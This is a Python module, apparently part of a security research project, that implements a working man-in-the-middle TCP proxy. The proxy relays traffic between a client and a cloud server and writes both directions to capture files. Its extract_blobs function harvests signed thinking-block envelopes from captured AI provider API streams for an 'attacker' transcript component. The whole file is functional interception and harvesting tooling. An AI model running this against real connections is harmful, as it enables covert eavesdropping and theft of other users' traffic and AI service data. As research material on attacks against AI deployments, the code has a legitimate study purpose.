#!/usr/bin/env python3
"""Man-in-the-middle tee proxy (pure stdlib sockets + threading).

Deployment shape (c): the attacker sits between the local node and the
cloud server, relaying traffic unchanged while teeing BOTH directions into
a capture journal.

Journal schema (FROZEN — owned by the wire_shape attack, match
byte-for-byte): one JSON object per line, exactly the keys

    {"ts": float epoch seconds, "bytes": int, "dir": "c2s"|"s2c",
     "session_id": str}

The journal is the traffic SHAPE (per-record sizes/directions/timings per
session). Because it deliberately carries counts, not payloads, the proxy
also tees the raw wire bytes into payload sidecars <journal>.c2s /
<journal>.s2c (concatenation order == journal order per direction) so a
captured stream can be reconstructed byte-for-byte for integrity checks.
Both are crash-safe: every record/payload is flushed before the bytes are
forwarded (cf. artifacts.append_jsonl).

Framing: frame="raw" tees one record per recv() chunk; frame="len32"
splits records at 4-byte big-endian length-prefixed frame boundaries (one
record per wire frame, bytes = 4 + payload; a truncated trailing frame is
flushed as a final record when the connection closes).

max_bytes caps the TOTAL teed bytes across both directions: over-cap
records are dropped (the relay itself is never throttled — capture must
not perturb the observed traffic) and stats() reports capped=True.

Usage:
    from attacker.mitm import MitmProxy
    with MitmProxy("127.0.0.1", 0, "cloud.internal", 9000,
                   "capture.jsonl", frame="len32", max_bytes=1 << 30) as p:
        print("listening on", p.port)   # ephemeral bind resolved
        ...
    print(p.stats())
"""

import json
import os
import socket
import struct
import threading
import time

SCHEMA_KEYS = ("ts", "bytes", "dir", "session_id")
FRAMES = ("raw", "len32")
_RECV = 65536


def _split_len32(buf):
    """Split a byte buffer into complete len32 frames; returns
    (frames, remainder). Frame = 4-byte big-endian length N + N payload
    bytes; the frame record covers all 4 + N wire bytes."""
    frames = []
    while len(buf) >= 4:
        n = struct.unpack(">I", buf[:4])[0]
        if len(buf) < 4 + n:
            break
        frames.append(buf[:4 + n])
        buf = buf[4 + n:]
    return frames, buf


class MitmProxy:
    """TCP relay teeing both directions into a capture journal.

    listen_host/listen_port   local bind (port 0 = ephemeral; read the
                              resolved port from the `port` property)
    target_host/target_port   where relayed traffic is forwarded
    journal_path              capture journal (frozen schema above);
                              payload sidecars land at <journal>.c2s/.s2c
    frame                     "raw" (per recv chunk) or "len32" (per frame)
    max_bytes                 total tee cap (None = uncapped); over-cap
                              records are dropped, relaying is unaffected
    """

    def __init__(self, listen_host, listen_port, target_host, target_port,
                 journal_path, frame="raw", max_bytes=None):
        if frame not in FRAMES:
            raise ValueError(f"frame must be one of {FRAMES}, got {frame!r}")
        self.listen_host = listen_host
        self.target_host = target_host
        self.target_port = int(target_port)
        self.journal_path = str(journal_path)
        self.frame = frame
        self.max_bytes = max_bytes
        self._listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._listener.bind((listen_host, int(listen_port)))
        self._listener.listen(64)
        self._listener.settimeout(0.2)
        self._port = self._listener.getsockname()[1]
        self._lock = threading.Lock()
        self._stopping = threading.Event()
        self._stopped = False
        self._accept_thread = None
        self._relay_threads = []
        self._sockets = set()
        self._session_counter = 0
        self._sessions = set()
        self._records = 0
        self._teed = 0
        self._bytes = {"c2s": 0, "s2c": 0}
        self.capped = False
        self._started_at = None
        self._stopped_at = None
        self._sealed = False
        parent = os.path.dirname(os.path.abspath(self.journal_path))
        os.makedirs(parent, exist_ok=True)
        self._journal = open(self.journal_path, "w", encoding="utf-8")
        self._streams = {"c2s": open(self.journal_path + ".c2s", "wb"),
                         "s2c": open(self.journal_path + ".s2c", "wb")}

    @property
    def port(self):
        """The actually-bound listen port (meaningful for ephemeral 0)."""
        return self._port

    def start(self):
        if self._accept_thread is None:
            self._started_at = time.time()
            self._accept_thread = threading.Thread(
                target=self._accept_loop, name="mitm-accept", daemon=True)
            self._accept_thread.start()
        return self

    def stop(self):
        """Graceful shutdown: close the listener and every session socket
        (which unblocks any recv still in flight), join the worker threads,
        THEN seal the journal — no relay outlives its journal. Idempotent."""
        if self._stopped:
            return self
        self._stopped = True
        self._stopping.set()
        try:
            self._listener.close()
        except OSError:
            pass
        with self._lock:
            socks = list(self._sockets)
            relays = list(self._relay_threads)
        for s in socks:
            for op in (lambda: s.shutdown(socket.SHUT_RDWR), s.close):
                try:
                    op()
                except OSError:
                    pass
        if self._accept_thread is not None:
            self._accept_thread.join(timeout=2)
        for t in relays:
            t.join(timeout=2)
        self._stopped_at = time.time()
        with self._lock:
            self._sealed = True
        for fh in [self._journal, *self._streams.values()]:
            try:
                fh.close()
            except Exception:
                pass
        return self

    def __enter__(self):
        return self.start()

    def __exit__(self, exc_type, exc, tb):
        self.stop()
        return False

    def stats(self):
        end = self._stopped_at or time.time()
        return {"records": self._records,
                "bytes_c2s": self._bytes["c2s"],
                "bytes_s2c": self._bytes["s2c"],
                "sessions": len(self._sessions),
                "duration_s": round(end - (self._started_at or end), 3),
                "capped": self.capped, "frame": self.frame,
                "max_bytes": self.max_bytes,
                "journal_path": self.journal_path}

    def _tee(self, session_id, direction, data):
        """Journal one record + tee the payload; flushed BEFORE the bytes
        are forwarded so a hard crash cannot lose a crossed record."""
        n = len(data)
        with self._lock:
            if self._sealed:
                return
            if self.max_bytes is not None \
                    and self._teed + n > self.max_bytes:
                self.capped = True
                return
            rec = {"ts": time.time(), "bytes": n, "dir": direction,
                   "session_id": session_id}
            self._journal.write(json.dumps(rec) + "\n")
            self._journal.flush()
            self._streams[direction].write(data)
            self._streams[direction].flush()
            self._teed += n
            self._records += 1
            self._bytes[direction] += n

    def _accept_loop(self):
        while not self._stopping.is_set():
            try:
                conn, _addr = self._listener.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                upstream = socket.create_connection(
                    (self.target_host, self.target_port), timeout=10)
            except OSError:
                conn.close()
                continue
            with self._lock:
                self._session_counter += 1
                session_id = f"s{self._session_counter:04d}"
                self._sessions.add(session_id)
                self._sockets.add(conn)
                self._sockets.add(upstream)
            if self._stopping.is_set():
                for s in (conn, upstream):
                    try:
                        s.close()
                    except OSError:
                        pass
                break
            for direction, src, dst in (("c2s", conn, upstream),
                                        ("s2c", upstream, conn)):
                t = threading.Thread(
                    target=self._relay,
                    args=(session_id, src, dst, direction),
                    name=f"mitm-{session_id}-{direction}", daemon=True)
                with self._lock:
                    self._relay_threads.append(t)
                t.start()

    def _relay(self, session_id, src, dst, direction):
        buf = b""
        try:
            while True:
                try:
                    chunk = src.recv(_RECV)
                except OSError:
                    break
                if not chunk:
                    break
                if self.frame == "len32":
                    buf += chunk
                    frames, buf = _split_len32(buf)
                    for fr in frames:
                        self._tee(session_id, direction, fr)
                else:
                    self._tee(session_id, direction, chunk)
                try:
                    dst.sendall(chunk)
                except OSError:
                    break
            if self.frame == "len32" and buf:
                self._tee(session_id, direction, buf)
        finally:
            for sock, how in ((dst, socket.SHUT_WR), (src, socket.SHUT_RD)):
                try:
                    sock.shutdown(how)
                except OSError:
                    pass


class _EchoServer:
    """Throwaway threaded echo server for self-tests and pytest cells:
    binds an ephemeral port and echoes every received chunk back unchanged
    until the peer closes. Not part of the attack surface."""

    def __init__(self, host="127.0.0.1"):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((host, 0))
        self._sock.listen(8)
        self._sock.settimeout(0.2)
        self.port = self._sock.getsockname()[1]
        self._stopping = threading.Event()
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()

    def _serve(self):
        while not self._stopping.is_set():
            try:
                conn, _ = self._sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._echo, args=(conn,),
                             daemon=True).start()

    @staticmethod
    def _echo(conn):
        try:
            while True:
                data = conn.recv(_RECV)
                if not data:
                    break
                conn.sendall(data)
        except OSError:
            pass
        finally:
            try:
                conn.close()
            except OSError:
                pass

    def close(self):
        self._stopping.set()
        try:
            self._sock.close()
        except OSError:
            pass
        self._thread.join(timeout=2)

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc, tb):
        self.close()
        return False


def _echo_roundtrip(proxy_port, payload, attempts=50):
    """Send `payload` through the proxy at `proxy_port` and read exactly
    len(payload) echoed bytes back; returns the echoed bytes. Connect
    refusals are retried briefly (a driver may still be binding)."""
    for attempt in range(attempts):
        try:
            conn = socket.create_connection(("127.0.0.1", proxy_port),
                                            timeout=5)
        except ConnectionRefusedError:
            if attempt + 1 == attempts:
                raise
            time.sleep(0.05)
            continue
        out = b""
        with conn:
            conn.sendall(payload)
            while len(out) < len(payload):
                chunk = conn.recv(_RECV)
                if not chunk:
                    break
                out += chunk
        return out


def _read_journal(path):
    with open(path, encoding="utf-8") as f:
        return [json.loads(line) for line in f if line.strip()]


def _find_envelopes(obj, path=()):
    """Recursively collect (key_path, blob) for provider-style envelopes:
    dicts carrying a non-empty string "signature" next to "thinking"/
    "type" (the Anthropic thinking-block shape)."""
    found = []
    if isinstance(obj, dict):
        sig = obj.get("signature")
        if isinstance(sig, str) and sig and ("thinking" in obj
                                             or "type" in obj):
            found.append((path + ("signature",), sig))
        for k, v in obj.items():
            found.extend(_find_envelopes(v, path + (str(k),)))
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            found.extend(_find_envelopes(v, path + (str(i),)))
    return found


def extract_blobs(journal_path):
    """Scan a capture's payload sidecars (<journal>.c2s / .s2c) for
    provider-style blob envelopes and return one record per harvested
    blob: {"dir", "line", "blob", "key_path"}.

    Line-oriented parser: SSE "data: {...}" lines and bare JSON lines are
    parsed, anything else is skipped (a tee'd TLS stream yields nothing —
    this harvests deployments whose link the proxy can actually read, cf.
    the module docstring's deployment shape (c)). Feeds the api-transcript
    surface (attacker.transcripts)."""
    out = []
    for direction in ("c2s", "s2c"):
        path = str(journal_path) + "." + direction
        if not os.path.isfile(path):
            continue
        with open(path, "rb") as f:
            data = f.read().decode("utf-8", errors="replace")
        for lineno, line in enumerate(data.splitlines(), 1):
            line = line.strip()
            if line.startswith("data:"):
                line = line[len("data:"):].strip()
            if not line.startswith("{"):
                continue
            try:
                obj = json.loads(line)
            except ValueError:
                continue
            for key_path, blob in _find_envelopes(obj):
                out.append({"dir": direction, "line": lineno, "blob": blob,
                            "key_path": "/".join(key_path)})
    return out


def self_test():
    ok = True

    def check(name, cond):
        nonlocal ok
        ok = ok and bool(cond)
        print(f"  [{'PASS' if cond else 'FAIL'}] {name}")

    import tempfile
    print("MITM tee proxy (pure python, localhost only):")

    with tempfile.TemporaryDirectory() as d, _EchoServer() as echo:
        journal = os.path.join(d, "raw.jsonl")
        payload = b"hello split-wire " * 100
        with MitmProxy("127.0.0.1", 0, "127.0.0.1", echo.port, journal,
                       frame="raw") as proxy:
            check("ephemeral bind exposes a live port",
                  isinstance(proxy.port, int) and proxy.port > 0)
            check("echo round-trips through the relay unchanged",
                  _echo_roundtrip(proxy.port, payload) == payload)
            check("a second session round-trips too",
                  _echo_roundtrip(proxy.port, b"second session") ==
                  b"second session")
            stats = proxy.stats()
        records = _read_journal(journal)
        check("journal records carry exactly the frozen schema keys",
              all(tuple(r) == SCHEMA_KEYS for r in records) and records)
        check("raw journal accounts for every relayed byte per direction",
              sum(r["bytes"] for r in records if r["dir"] == "c2s")
              == len(payload) + len(b"second session")
              and sum(r["bytes"] for r in records if r["dir"] == "s2c")
              == len(payload) + len(b"second session"))
        c2s = open(journal + ".c2s", "rb").read()
        s2c = open(journal + ".s2c", "rb").read()
        check("payload sidecars reconstruct both directions byte-for-byte",
              c2s == payload + b"second session"
              and s2c == payload + b"second session")
        check("record types are the frozen ones",
              all(isinstance(r["ts"], float) and isinstance(r["bytes"], int)
                  and r["dir"] in ("c2s", "s2c")
                  and isinstance(r["session_id"], str) for r in records))
        per_dir = {}
        for r in records:
            key = (r["session_id"], r["dir"])
            per_dir.setdefault(key, []).append(r["ts"])
        check("ts is non-decreasing within each session/direction",
              all(ts == sorted(ts) for ts in per_dir.values()))
        check("two sessions got distinct session_id strings",
              len({r["session_id"] for r in records}) == 2)
        check("stats() counts records/bytes/sessions",
              stats["records"] == len(records)
              and stats["bytes_c2s"] == stats["bytes_s2c"]
              == len(payload) + len(b"second session")
              and stats["sessions"] == 2 and stats["capped"] is False)

        journal2 = os.path.join(d, "len32.jsonl")
        m1, m2 = b"alpha-frame", b"beta!" * 40
        framed = struct.pack(">I", len(m1)) + m1 \
            + struct.pack(">I", len(m2)) + m2
        with MitmProxy("127.0.0.1", 0, "127.0.0.1", echo.port, journal2,
                       frame="len32") as proxy:
            check("len32 echo round-trips unchanged",
                  _echo_roundtrip(proxy.port, framed) == framed)
        sizes = [r["bytes"] for r in _read_journal(journal2)
                 if r["dir"] == "c2s"]
        check("len32 records split exactly on frame boundaries",
              sizes == [4 + len(m1), 4 + len(m2)])
        check("len32 sidecar is the exact wire stream",
              open(journal2 + ".c2s", "rb").read() == framed)

        journal3 = os.path.join(d, "capped.jsonl")
        with MitmProxy("127.0.0.1", 0, "127.0.0.1", echo.port, journal3,
                       max_bytes=len(payload) - 1) as proxy:
            check("relay unaffected by the tee cap",
                  _echo_roundtrip(proxy.port, payload) == payload)
            stats3 = proxy.stats()
        capped_records = _read_journal(journal3)
        check("cap drops over-budget records and sets capped=True",
              stats3["capped"] is True
              and sum(r["bytes"] for r in capped_records)
              <= len(payload) - 1)

    print("SELF-TEST " + ("PASSED" if ok else "FAILED"))
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(self_test())
